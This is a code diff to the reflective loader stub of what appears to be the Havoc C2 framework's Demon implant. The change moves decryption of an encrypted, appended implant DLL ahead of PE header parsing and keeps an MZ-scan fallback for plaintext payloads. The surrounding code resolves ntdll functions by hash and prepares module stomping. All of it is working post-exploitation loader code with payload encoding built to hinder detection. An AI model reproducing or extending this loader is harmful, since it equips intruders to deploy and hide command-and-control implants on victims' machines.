@@ -50,12 +50,22 @@ SEC( text, B ) VOID Entry( VOID )
     PIMAGE_NT_HEADERS       StompNt         = NULL;
 
     // 0. Get our own base address and locate the appended Demon DLL.
-    //    GetRIP returns an address inside this stub; page-align it to find the
-    //    allocation base (the stub always starts at offset 0).  The teamserver
-    //    writes the template size into gDllOffset, so base + offset = DLL start.
-    //    This is reliable even when the DLL is encoded (no MZ to scan for).
-    ULONG_PTR stubBase    = ( ULONG_PTR ) GetRIP( ) & ~( PAGE_SIZE - 1 );
-    KaynLibraryLdr        = C_PTR( stubBase + gDllOffset );
+    // 0. Locate the appended Demon DLL.
+    //    Encoded: use GetRIP + gDllOffset (no MZ to scan for in ciphertext).
+    //    Plaintext: use KaynCaller (proven MZ scan, works on all Windows versions).
+    if ( gCryptKey[ 0 ] != CRYPT_KEY_MARKER[ 0 ] )
+    {
+        ULONG_PTR stubBase = ( ULONG_PTR ) GetRIP( ) & ~( PAGE_SIZE - 1 );
+        KaynLibraryLdr = C_PTR( stubBase + gDllOffset );
+
+        // Decode BEFORE reading any PE fields — everything is ciphertext.
+        CryptDecodeBuffer( KaynLibraryLdr, ( DWORD ) gDllSize, gCryptKey, CRYPT_KEY_LEN - 1 );
+    }
+    else
+    {
+        KaynLibraryLdr = KaynCaller( );
+    }
+
     Instance.Modules.Ntdll = LoaderModPebbb( NTDLL_HASH );
 
     Instance.Win32.LdrLoadDll              = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRLOADDLL );
@@ -63,13 +73,6 @@ SEC( text, B ) VOID Entry( VOID )
     Instance.Win32.NtAllocateVirtualMemory = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTALLOCATEVIRTUALMEMORY );
     Instance.Win32.NtProtectVirtualMemory  = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY );
     Instance.Win32.NtFreeVirtualMemory     = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTFREEVIRTUALMEMORY );
-
-    // Decode the appended DLL BEFORE reading any PE fields. When the
-    // teamserver encoded the payload the entire DLL region is ciphertext,
-    // including the DOS/NT headers we need below. Decode in one pass using
-    // the size the teamserver patched into gDllSize.
-    if ( gCryptKey[ 0 ] != CRYPT_KEY_MARKER[ 0 ] )
-        CryptDecodeBuffer( KaynLibraryLdr, ( DWORD ) gDllSize, gCryptKey, CRYPT_KEY_LEN - 1 );
 
     NtHeaders = C_PTR( KaynLibraryLdr + ( ( PIMAGE_DOS_HEADER ) KaynLibraryLdr )->e_lfanew );
     SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
